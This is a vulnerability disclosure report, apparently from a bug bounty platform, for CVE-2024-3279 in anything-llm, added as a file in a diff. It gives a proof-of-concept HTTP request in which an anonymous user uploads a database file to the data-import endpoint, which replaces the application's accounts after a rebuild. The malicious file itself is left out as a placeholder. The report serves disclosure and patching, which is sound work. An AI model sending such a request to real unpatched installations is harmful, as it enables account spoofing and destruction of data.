@@ -1,0 +1,48 @@
+Title: Anonymous access to import endpoint leads to anythingllm.db deletion/spoofing in mintplex-labs/anything-llm
+
+Proof of Concept: 
+Let's suppose that we have following list of accounts in the application:
+
+Unauthorized, anonymous attacker (without account in the application) is able to import its own database file with following HTTP request:
+
+POST /api/system/data-import HTTP/1.1
+Host: localhost:3001
+Content-Type: multipart/form-data; boundary=---------------------------33395526712532357982198249216
+Content-Length: 5181
+
+-----------------------------33395526712532357982198249216
+Content-Disposition: form-data; name="file"; filename="bad.zip"
+Content-Type: application/zip
+
+PK
+[ANYTHINGLLM DATABASE FILE IN HEX]
+
+HTTP response:
+
+HTTP/1.1 200 OK
+[...]
+{"success":true,"error":null}
+
+As a result, the attacker imported his own database file. When container will be rebuilded (i.e., sudo docker compose up -d --build), attacker's database file will be used as new database file. After conducting the attack and rebuilding the container, the list of accounts has been altered in accordance with the attacker's file:
+
+Impact: 
+This vulnerability allows an unauthorized attacker to delete or spoof anythingllm.db database file.
+
+CVE ID: CVE-2024-3279
+Status: (published)
+Vulnerability Type: CWE-284: Improper Access Control
+Severity: Critical (9.1)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: None
+Scope: Unchanged
+Confidentiality: None
+Integrity: High
+Availability: High
+Registry: Other
+Affected Version: latest
+Visibility: Public
+Status: Fixed
+Disclosure Bounty: $1500
+Fix Bounty: $375
